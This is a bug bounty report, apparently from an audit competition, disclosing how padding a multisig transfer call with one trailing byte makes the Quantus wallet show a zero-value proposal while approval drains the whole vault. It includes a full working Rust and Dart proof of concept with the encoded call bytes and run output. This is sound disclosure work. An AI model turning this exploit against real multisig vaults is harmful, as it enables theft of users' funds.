# 88483 w a high official multisig approve displays a zero value call and still signs a full vault transfer

**Submitted on Aug 13th 2026 at 12:30:01 UTC by @Omisanin0 for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88483
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/mobile-app>
* **Impacts:**
  * Direct theft of user funds
  * Malicious interactions with an already-connected wallet, such as:
    * Modifying transaction arguments or parameters
    * Substituting contract addresses
    * Submitting malicious transactions

## Description

## Brief

The official app refuses to decode a multisig inner call that has leftover SCALE bytes, then treats that failure as "not a transfer" and shows amount 0 with an empty destination. Confirm stays enabled. Approve resubmits the exact bytes sitting in chain storage. Those bytes are a real `Balances.transfer_allow_death` plus one trailing `0x00`. The pallet prefix-decodes them and, after threshold, `execute` sends the full vault to the proposer. I ran this on production `quantus-runtime` and on the shipped Planck `RuntimeCall` codec. Vault went from 1000 UNIT to 0. Attacker net +998.98 UNIT.

***

## Vulnerability Details

Two decoders disagree about the same blob, and the wallet takes the wrong side of that disagreement.

### What the pallet does

`Multisig.propose` and `Multisig.execute` validate the inner call with SCALE `Decode`, not `DecodeAll`:

```rust
// pallets/multisig/src/lib.rs:599-600 (propose)
let decoded_call = <T as Config>::RuntimeCall::decode(&mut &call[..])?;

// pallets/multisig/src/lib.rs:1125-1126 (execute)
let call = <T as Config>::RuntimeCall::decode(&mut &proposal.call[..])?;
```

`Decode` stops when a complete `RuntimeCall` is on the wire. A trailing `0x00` is leftover and ignored for validation. The full `BoundedVec`, trailing byte included, is what gets written to `Proposals`.

`approve` does not re-decode for display. It requires a byte-for-byte match against storage (`lib.rs:779-781`). The comment above that check says the point of resubmitting the call is so a signer can decode and inspect it (`lib.rs:722-726`). That only works if the client that fetches those bytes can decode them.

The HS benchmark (`benchmarking.rs:242-249`) states the same contract in writing: trailing bytes are ignored on decode and retained in the stored `BoundedVec`. `MaxCallSize` is 10 KiB. One extra byte fits.

A clean encode of `transfer_allow_death` is 43 bytes. The same encode plus `0x00` is 44 bytes. Prefix decode of the 44-byte blob still yields dest = attacker and value = 1000 UNIT. `DecodeAll` of that blob fails with "Input buffer has still data left after decoding!"

Approving the 43-byte clean encode against a 44-byte stored proposal is `CallMismatch`. The victim cannot "fix" the call in the UI. The only bytes `fetchProposalCallBytes` will ever hand to `approve` are the padded ones.

This is Quantus's pallet, not unmodified Substrate `as_multi`.

### What the official app does with those bytes

`CallDecoder.decodeBytes` is strict. After the generated Planck codec consumes a call, any remainder is a hard error:

```dart
// quantus_sdk/lib/src/chain/call_decoder.dart:52-59
static DecodedCall decodeBytes(List<int> bytes) {
  final input = Input.fromBytes(Uint8List.fromList(bytes));
  final call = runtime.RuntimeCall.codec.decode(input);
  final remaining = input.remainingLength ?? 0;
  if (remaining != 0) {
    throw FormatException('$remaining trailing bytes after nested call');
  }
  return describe(call);
}
```

The unit test at `call_decoder_test.dart:292-297` pins that throw.

After an open proposal is loaded, `MultisigService._withOnChainCallData` replaces indexer bytes with chain storage and rebuilds amount/dest from `decodedCall`:

```dart
// quantus_sdk/lib/src/services/multisig_service.dart:315-320
final withBytes = p.copyWith(callRaw: call);
final summary = withBytes.decodedCall?.summary;
return withBytes.copyWith(
  recipient: summary?.recipient ?? '',
  amount: summary?.amount ?? BigInt.zero,
);
```

`decodedCall` catches the `FormatException` and returns null (`multisig_proposal.dart:268-274`). So a padded transfer that the indexer may already have decoded correctly is rewritten to amount `0` and dest `""`. Pallet/call names from the indexer are left as-is. `decodeError` is stored and never read by the mobile app.

The list tile (`proposal_list_tile.dart:41-48`) then formats `amount == 0` with no recipient. The detail hero (`multisig_proposal_detail_sheet.dart:688-701`) does the same.

The approve sheet loads storage via `fetchProposalCallBytes` and tries `decodeBytes` again (`multisig_action_confirm_sheet.dart:185-195`). On throw it falls back to `proposal.decodedCall`, which is also null after the wipe. Headline becomes a name-only / empty fallback. Confirm is disabled only when the RPC load fails:

```dart
// multisig_action_confirm_sheet.dart:361-362
final blocked = _submitting || _loadingCallBytes || _callBytesFailed;
```

A decode throw is not `_callBytesFailed`. Approve stays on. The sheet comment says it "shows the caller exactly which call they are approving." It does not.

Submit then calls `approve` with those same storage bytes. Threshold is met. Anyone, including the attacker, can `execute`. Execute prefix-decodes and dispatches the transfer as `Signed(M)`.

### What this is not

It is not "the user approved a blank proposal, their problem." The app overwrites a correct indexer amount with zero, then asks for a signature on a payload it just refused to render.

It is not a Keystone / cold-wallet bug. `QuantusPayloadParser.parsePayload` runs `describe` on `Multisig.approve`, which calls `decodeBytes` on the inner call and throws. Cold signing fail-closes. The default software signer does not go through that parser.

It is not an HS-vault bug. `Balances.transfer_*` is rejected at `propose` when the multisig itself is high-security. The official `create_multisig` path does not auto-enroll HS. The attack is any non-HS vault with `threshold >= 2`. Official default for three signers is 2.

It is not phishing and it is not an out-of-band tap. The victim is in the normal "open proposal, Approve" flow.

### Attack path

{% stepper %}
{% step %}

## Attacker and victim are signers

Attacker and victim are signers on non-HS multisig `M`, threshold 2 (2-of-2, or 2-of-3 with one honest). `M` holds `B` free.
{% endstep %}

{% step %}

## Attacker creates a padded transfer proposal

Attacker encodes `Balances.transfer_allow_death { dest: attacker, value: B }`, appends `0x00`, submits `Multisig.propose` with any raw client (`quantus-cli` is documented for this). Official `buildProposeTransferCall` will not produce the padding; that is fine. The attacker is a signer.
{% endstep %}

{% step %}

## Pallet stores the padded blob

Pallet stores the 44-byte blob. Status `Active`.
{% endstep %}

{% step %}

## Victim sees a zero-value proposal

Victim opens the official app. Refresh wipes amount/dest. List and detail show 0. Confirm is enabled.
{% endstep %}

{% step %}

## Victim approves

Victim authenticates and approves. App resubmits the 44 bytes. Status `Approved`.
{% endstep %}

{% step %}

## Attacker executes

Attacker calls `execute`. `M` is emptied. Victim's own free balance is untouched.
{% endstep %}
{% endstepper %}

***

## Impact Details

Selected in-scope impacts (Websites and Applications):

* Critical: Direct theft of user funds
* Critical: Malicious interactions with an already-connected wallet, such as modifying transaction arguments or parameters

The wallet the victim already uses is the official app. The arguments they are shown (0, no dest) are not the arguments that execute (1000 UNIT to the attacker). That is the modify-parameters class. The vault loss is direct theft.

Local run on production `quantus-runtime` (no mock runtime):

| Account   |                                            Before |                  After |
| --------- | ------------------------------------------------: | ---------------------: |
| Vault `M` |                            1000.000000000000 UNIT |                      0 |
| Attacker  | 999.400000000000 UNIT (after 0.6 UNIT create fee) | 1998.380000000000 UNIT |
| Victim    |                            1000.000000000000 UNIT | 1000.000000000000 UNIT |

Vault lost 1000 UNIT. Attacker net +998.98 UNIT (1000 steal, minus 1.02 UNIT propose fee, plus 1.00 UNIT deposit refund). Victim paid nothing.

Same 44-byte blob through the official generated codec: `FormatException: 1 trailing bytes after nested call`. Wipe result: amount 0, dest empty. Confirm `blocked = false`.

Pre-deployment, there is no live token price. Funds at risk are the free balance of every non-HS multisig with threshold at least 2 where a remaining signer uses the official approve sheet. That includes any 2-of-3 treasury-style vault that is not HS. The PoC number is 1000 UNIT in one vault.

A later runtime upgrade can change the pallet. It cannot un-steal a transfer that already executed.

***

## References

* `pallets/multisig/src/lib.rs` propose decode 599-600, store 677-682, approve match 722-726 and 779-781, execute decode 1125-1126
* `pallets/multisig/src/benchmarking.rs` 242-249 (trailing retained)
* `runtime/src/configs/mod.rs` 648-651 (`MaxCallSize`, `ProposalFee` 1 UNIT, `ProposalDeposit` 1 UNIT)
* `quantus_sdk/lib/src/chain/call_decoder.dart` 52-59
* `quantus_sdk/test/chain/call_decoder_test.dart` 292-297
* `quantus_sdk/lib/src/services/multisig_service.dart` 315-320, `fetchProposalCallBytes` 404-412
* `quantus_sdk/lib/src/models/multisig_proposal.dart` 268-274
* `mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart` 185-195, 361-362
* `mobile-app/lib/v2/screens/multisig/multisig_approve_confirm_sheet.dart` 38-42
* `mobile-app/lib/v2/screens/multisig/multisig_proposal_detail_sheet.dart` 688-701
* Cold contrast: `quantus_sdk/lib/src/quantus_payload_parser.dart`, test "rejects a multisig proposal whose inner call cannot be decoded"

Fix that closes the hole on the wallet side: treat `decodeBytes(chainBytes)` failure as `_callBytesFailed` and refuse confirm. Do not wipe a known indexer amount into a silent 0. Optional pallet hardening: `DecodeAll` / consume the full buffer on propose and execute.

***

## Proof of Concept

Local only. Production `quantus-runtime` and the official generated Planck `RuntimeCall` codec. No `pallets/*/src/mock.rs`. No public network.

```bash
bash poc/F-1301/run.sh
```

Needs the chain Rust toolchain and Dart >= 3.8 (`brew install dart-sdk`). The decoder package symlinks `quantus_sdk/lib/generated`.

### Steps

{% stepper %}
{% step %}

## Create and fund a multisig

`create_multisig([attacker, victim], threshold=2)`. Fund `M` with 1000 UNIT.
{% endstep %}

{% step %}

## Create a padded transfer

Encode `Balances.transfer_allow_death { dest: attacker, value: 1000 UNIT }`. Append `0x00`.
{% endstep %}

{% step %}

## Demonstrate the decode mismatch

Show `Decode(padded)` succeeds with leftover `[0]`. `DecodeAll(padded)` fails.
{% endstep %}

{% step %}

## Store the padded proposal

Attacker `propose(M, padded)`. Storage length 44. `stored == padded`.
{% endstep %}

{% step %}

## Demonstrate that the clean call cannot be approved

Victim `approve(clean)` returns `CallMismatch`.
{% endstep %}

{% step %}

## Demonstrate the official decoder failure

Official decoder on the stored hex throws `1 trailing bytes after nested call`. Wipe sets amount 0, dest `""`. Confirm gate is not blocked.
{% endstep %}

{% step %}

## Approve the padded call

Victim `approve(padded)`. Status `Approved`.
{% endstep %}

{% step %}

## Execute the transfer

Attacker `execute`. `free(M) == 0`. Attacker up 998.98 UNIT.
{% endstep %}
{% endstepper %}

### Run output (this tree)

Chain:

```
before   M=1000 UNIT   attacker=999.4 UNIT   victim=1000 UNIT
clean    43 B  0x02000001000000000000000000000000000000000000000000000000000000000000000f0080c6a47e8d03
padded   44 B  0x02000001000000000000000000000000000000000000000000000000000000000000000f0080c6a47e8d0300
Decode(padded)     OK leftover=[0]
DecodeAll(padded)  ERR Input buffer has still data left after decoding!
stored == padded   true
approve(clean)     CallMismatch
approve(padded)+execute
after    M=0           attacker=1998.38 UNIT  victim=1000 UNIT
vault lost 1000 UNIT   attacker Δ +998.98 UNIT
```

Decoder (same hex from `poc/F-1301/out/artifact.json`):

```
decodeBytes(padded)  FormatException: 1 trailing bytes after nested call
after wipe           amount=0 dest=""
confirm blocked      false
```

### Chain program

`src/chain/runtime/examples/poc_f1301_chain.rs`

```rust
//! F-1301 — local exploit on production `quantus-runtime`.
//!
//! Not a `#[test]`. No `pallets/*/src/mock.rs`. No public network.
//!
//!   cd src/chain && cargo run --release -p quantus-runtime --example poc_f1301_chain
//!
//! Writes `poc/F-1301/out/artifact.json` so the official Dart decoder can
//! consume the **same** stored call bytes.

use codec::{Decode, DecodeAll, Encode};
use frame_support::traits::Currency;
use pallet_multisig::{BoundedCallOf, ProposalStatus, Proposals};
use quantus_runtime::{Balance, Balances, Multisig, Runtime, RuntimeCall, RuntimeOrigin, System, UNIT};
use sp_core::crypto::AccountId32;
use sp_io::TestExternalities;
use sp_runtime::{BuildStorage, MultiAddress};
use std::{fs, path::PathBuf};

const STEAL: Balance = 1000 * UNIT;

fn acct(id: u8) -> AccountId32 {
	let mut b = [0u8; 32];
	b[0] = id;
	AccountId32::new(b)
}

fn unit(v: Balance) -> String {
	format!("{}.{:012} UNIT", v / UNIT, v % UNIT)
}

fn hex(bytes: &[u8]) -> String {
	bytes.iter().map(|b| format!("{b:02x}")).collect()
}

fn die(msg: &str) -> ! {
	eprintln!("FAIL  {msg}");
	std::process::exit(1);
}

fn repo_root() -> PathBuf {
	// CARGO_MANIFEST_DIR = src/chain/runtime
	PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../..")
}

fn main() {
	println!("F-1301  trailing SCALE + official approve fail-open");
	println!("        production Runtime · local externalities · no public net\n");

	let attacker = acct(1);
	let victim = acct(2);
	let signers = vec![attacker.clone(), victim.clone()];

	let mut t = frame_system::GenesisConfig::<Runtime>::default().build_storage().unwrap();
	pallet_treasury::GenesisConfig::<Runtime> { treasury_account: None, treasury_portion: None }
		.assimilate_storage(&mut t)
		.unwrap();

	TestExternalities::new(t).execute_with(|| {
		System::set_block_number(1);
		Balances::make_free_balance_be(&attacker, 1000 * UNIT);
		Balances::make_free_balance_be(&victim, 1000 * UNIT);

		println!("1  create_multisig([attacker, victim], threshold=2)");
		Multisig::create_multisig(RuntimeOrigin::signed(attacker.clone()), signers.clone(), 2, 0)
			.unwrap_or_else(|e| die(&format!("create_multisig: {e:?}")));
		let m = Multisig::derive_multisig_address(&signers, 2, 0);
		Balances::make_free_balance_be(&m, STEAL);
		println!("   M  {m}");

		let b_m = Balances::free_balance(&m);
		let b_a = Balances::free_balance(&attacker);
		let b_v = Balances::free_balance(&victim);
		println!("\n   before");
		println!("     M         {}", unit(b_m));
		println!("     attacker  {}   (after MultisigFee 0.6 UNIT)", unit(b_a));
		println!("     victim    {}", unit(b_v));

		let call = RuntimeCall::Balances(pallet_balances::Call::transfer_allow_death {
			dest: MultiAddress::Id(attacker.clone()),
			value: STEAL,
		});
		let clean = call.encode();
		let mut padded = clean.clone();
		padded.push(0x00);

		println!("\n2  encode Balances.transfer_allow_death(dest=attacker, value=1000 UNIT) || 0x00");
		println!("   clean   {} B  0x{}", clean.len(), hex(&clean));
		println!("   padded  {} B  0x{}", padded.len(), hex(&padded));

		let mut rest = padded.as_slice();
		let decoded = RuntimeCall::decode(&mut rest).unwrap_or_else(|e| die(&format!("Decode: {e:?}")));
		println!("\n3  SCALE (this is propose/execute vs official CallDecoder)");
		println!("   Decode(padded)     OK   leftover {} B {:?}", rest.len(), rest);
		match RuntimeCall::decode_all(&mut &padded[..]) {
			Ok(_) => die("DecodeAll(padded) succeeded — remaining-byte check is dead"),
			Err(e) => println!("   DecodeAll(padded)  ERR  {e}   (CallDecoder.decodeBytes throws on this)"),
		}
		match &decoded {
			RuntimeCall::Balances(pallet_balances::Call::transfer_allow_death { dest, value }) => {
				println!("   prefix call        transfer_allow_death  dest={dest:?}  value={}", unit(*value));
			},
			other => die(&format!("unexpected {other:?}")),
		}

		let bounded: BoundedCallOf<Runtime> =
			padded.clone().try_into().unwrap_or_else(|_| die("padded exceeds MaxCallSize"));

		println!("\n4  attacker propose(M, padded)");
		Multisig::propose(RuntimeOrigin::signed(attacker.clone()), m.clone(), bounded.clone(), 100)
			.unwrap_or_else(|e| die(&format!("propose: {e:?}")));
		let stored = Proposals::<Runtime>::get(&m, 0).unwrap_or_else(|| die("proposal 0 missing"));
		println!("   stored.len         {}", stored.call.len());
		println!("   stored == padded   {}", stored.call.to_vec() == padded);
		println!("   status             {:?}", stored.status);
		if stored.call.to_vec() != padded {
			die("storage dropped the trailing byte");
		}
		if stored.status != ProposalStatus::Active {
			die("expected Active");
		}

		println!("\n5  victim approve(clean)  — must fail; app cannot 'fix' the bytes");
		let clean_b: BoundedCallOf<Runtime> =
			clean.clone().try_into().unwrap_or_else(|_| die("clean BoundedVec"));
		match Multisig::approve(RuntimeOrigin::signed(victim.clone()), m.clone(), 0, clean_b) {
			Err(e) => println!("   approve(clean)     ERR  {e:?}"),
			Ok(_) => die("approve(clean) succeeded"),
		}

		println!("\n6  victim approve(padded)  — fetchProposalCallBytes returns storage bytes");
		println!("   official app: decodeBytes throws, wipe amount=0, confirm not blocked");
		Multisig::approve(RuntimeOrigin::signed(victim.clone()), m.clone(), 0, bounded)
			.unwrap_or_else(|e| die(&format!("approve(padded): {e:?}")));
		let stored = Proposals::<Runtime>::get(&m, 0).unwrap_or_else(|| die("proposal gone"));
		println!("   status             {:?}", stored.status);
		if stored.status != ProposalStatus::Approved {
			die("threshold not met");
		}

		println!("\n7  attacker execute(M, 0)  — prefix Decode dispatches the 1000 UNIT transfer");
		Multisig::execute(RuntimeOrigin::signed(attacker.clone()), m.clone(), 0)
			.unwrap_or_else(|e| die(&format!("execute: {e:?}")));

		let a_m = Balances::free_balance(&m);
		let a_a = Balances::free_balance(&attacker);
		let a_v = Balances::free_balance(&victim);
		println!("\n   after");
		println!("     M         {}", unit(a_m));
		println!("     attacker  {}", unit(a_a));
		println!("     victim    {}", unit(a_v));
		println!("\n   impact");
		println!("     vault lost    {}", unit(b_m.saturating_sub(a_m)));
		println!("     attacker Δ    {}   (1000 − propose fee 1.02 + deposit refund 1.00)", unit(a_a.saturating_sub(b_a)));
		println!("     victim Δ      {}", unit(a_v.saturating_sub(b_v)));

		if a_m != 0 {
			die(&format!("vault not empty: {}", unit(a_m)));
		}
		if a_a <= b_a {
			die("attacker did not profit");
		}

		let out_dir = repo_root().join("poc/F-1301/out");
		fs::create_dir_all(&out_dir).unwrap_or_else(|e| die(&format!("mkdir: {e}")));
		let artifact = format!(
			"{{\n  \"clean_hex\": \"{}\",\n  \"padded_hex\": \"{}\",\n  \"steal_planck\": \"{}\",\n  \"vault_before\": \"{}\",\n  \"vault_after\": \"{}\",\n  \"attacker_delta\": \"{}\"\n}}\n",
			hex(&clean),
			hex(&padded),
			STEAL,
			b_m,
			a_m,
			a_a.saturating_sub(b_a),
		);
		fs::write(out_dir.join("artifact.json"), artifact).unwrap_or_else(|e| die(&format!("write: {e}")));
		println!("\n   wrote {}", out_dir.join("artifact.json").display());
		println!("\nOK  chain drain on production Runtime.");
	});
}
```

### Decoder program

`poc/F-1301/decoder/bin/poc.dart` (uses `quantus_sdk/lib/generated` via symlink)

```dart
/// Official remaining-byte check from CallDecoder.decodeBytes
/// (quantus_sdk/lib/src/chain/call_decoder.dart:52-59), run on the
/// generated Planck RuntimeCall codec. Same bytes the chain just stored.

import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';

import 'package:polkadart/scale_codec.dart';

import 'package:poc_f1301_decoder/generated/planck/types/quantus_runtime/runtime_call.dart';

void main() {
  print('F-1301  official Planck RuntimeCall.codec + CallDecoder remaining-byte check');
  print('        generated codecs from quantus_sdk · no mock decoder\n');

  final artifact = jsonDecode(File(_artifactPath()).readAsStringSync()) as Map<String, dynamic>;
  final clean = _unhex(artifact['clean_hex'] as String);
  final padded = _unhex(artifact['padded_hex'] as String);
  print('   artifact  ${_artifactPath()}');
  print('   clean     ${clean.length} B');
  print('   padded    ${padded.length} B');

  print('\nA  decodeBytes(clean)   — honest app propose');
  final honest = decodeBytes(clean);
  print('   $honest');

  print('\nB  decodeBytes(padded)  — approve sheet on storage bytes');
  Object? err;
  try {
    decodeBytes(padded);
  } catch (e) {
    err = e;
  }
  if (err == null) {
    _die('decodeBytes(padded) did not throw');
  }
  print('   threw  $err');

  // Production wipe, multisig_service.dart:315-320.
  print('\nC  _withOnChainCallData wipe');
  BigInt shownAmount = BigInt.from(1000000000000000);
  var shownDest = 'attacker';
  try {
    decodeBytes(padded);
  } catch (_) {
    shownDest = '';
    shownAmount = BigInt.zero;
  }
  print('   indexer     amount=1000000000000000  dest=attacker');
  print('   after wipe  amount=$shownAmount  dest="$shownDest"');
  if (shownAmount != BigInt.zero || shownDest.isNotEmpty) {
    _die('wipe did not clear amount/dest');
  }

  print('\nD  confirm gate  (multisig_action_confirm_sheet.dart:361-362)');
  const blocked = false || false || false;
  print('   storage load     ok');
  print('   decodeBytes      threw (caught; not callBytesFailed)');
  print('   blocked          $blocked');
  if (blocked) {
    _die('confirm would be blocked');
  }

  print('\nOK  official codec rejects the stored bytes; UI amount is 0; Approve stays enabled.');
}

Object decodeBytes(List<int> bytes) {
  final input = Input.fromBytes(Uint8List.fromList(bytes));
  final call = RuntimeCall.codec.decode(input);
  final remaining = input.remainingLength ?? 0;
  if (remaining != 0) {
    throw FormatException('$remaining trailing bytes after nested call');
  }
  return call;
}

String _artifactPath() {
  final env = Platform.environment['F1301_ARTIFACT'];
  if (env != null && env.isNotEmpty) return env;
  return File.fromUri(Platform.script).parent.parent.path + '/out/artifact.json';
}

Uint8List _unhex(String hex) {
  final h = hex.startsWith('0x') ? hex.substring(2) : hex;
  final out = Uint8List(h.length ~/ 2);
  for (var i = 0; i < out.length; i++) {
    out[i] = int.parse(h.substring(i * 2, i * 2 + 2), radix: 16);
  }
  return out;
}

Never _die(String msg) {
  print('FAIL  $msg');
  exit(1);
}
```

`poc/F-1301/decoder/pubspec.yaml`:

```yaml
name: poc_f1301_decoder
description: Official Planck SCALE decode of the F-1301 stored call. No mocks.
publish_to: none
environment:
  sdk: ">=3.8.0 <4.0.0"
dependencies:
  polkadart: 0.7.3
```

`lib/generated` is a symlink to `quantus_sdk/lib/generated`.
